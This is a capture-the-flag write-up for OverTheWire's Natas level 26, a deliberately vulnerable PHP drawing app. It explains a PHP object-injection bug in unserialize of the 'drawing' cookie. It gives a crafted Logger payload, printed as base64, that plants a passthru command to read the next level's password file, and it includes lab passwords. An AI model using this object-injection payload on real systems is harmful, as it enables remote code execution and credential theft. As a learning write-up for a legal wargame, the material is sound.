# Natas Level 26
```bash
Username: natas26
Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
URL:      http://natas26.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas26.png" />
    <div align="center">Natas 26</div>
</figure>

And the scripts are:
```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>
```

And:
```php
<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
    
?>
```

Lets try to understand.

Upon load after starting session, the second script checks if the key "drawing" exist in the cookie, and if true, and x1, y1, x2, y2 are in the GET parameters:
it stores $imgfile="img/natas26_" . session_id() .".png";
calls *drawImage($imgfile)* and calls show*Image($imgfile)*.
Finally it calls *storeData*.

We can see the definitions in the first script.
* *showImage($filename)* - checks if the file exists, and if so, inclues &lt;img&gt; tag with in the page.
* *drawImage($filename)* - calls *[imagecreatetruecolor](http://php.net/manual/en/function.imagecreatetruecolor.php)* and get image identifier in $img.
calls *drawFromUserdata($img)*,
saves the image in png (with [imagepng](http://php.net/manual/en/function.imagepng.php)),
and destroys the image object (with [imagedestroy](http://php.net/manual/en/function.imagedestroy.php).
* *drawFromUserdata($img)* - checks for x1, y1, x2, y2 GET parameters,
allocates color for the image (with [imagecolorallocate](http://php.net/manual/en/function.imagecolorallocate.php),
draws the line (with [imageline](http://php.net/manual/en/function.imageline.php)),
if key "drawing" found in the cookie: sets $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
and for each object the the cookie, draws the line.
* *storeData* - if found x1, y1, x2, y2 GET parameters, adds it to the cookie, and sets cookie ("drawing") as: base64_encode(serialize($drawing));
We can see that the object Logger is not being used, and that it have a destructor which we can use:
```php
function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
}
```

On page load, the code uses *unserialize* function which is vulnerable to "[object injection](https://www.owasp.org/index.php/PHP_Object_Injection)".

Consider the following PHP code:
```php
<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        // $this->initMsg="#--session started--#\n";
        $this->exitMsg="<? passthru('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/natas27_passwd.php";
    }
}

$obj = new Logger();

echo base64_encode(serialize($obj));
?>
```

It outputs:
```bash
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMjoiaW1nL25hdGFzMjdfcGFzc3dkLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtOO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo0OToiPD8gcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ==
```

If we set this value to "drawning" cookie, the *destruct* function will be called and the password will be written to the "img/natas27_passwd.php" file:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas26-object-injection.png" />
    <div align="center">Natas 26 - Object injection</div>
</figure>

Now, we just need to call this [URL](http://natas26.natas.labs.overthewire.org/img/natas27_passwd.php), and we will get the password:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas26-pwned.png" />
    <div align="center">Natas 26 - PWNed</div>
</figure>

We got the password for the next level: **55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ**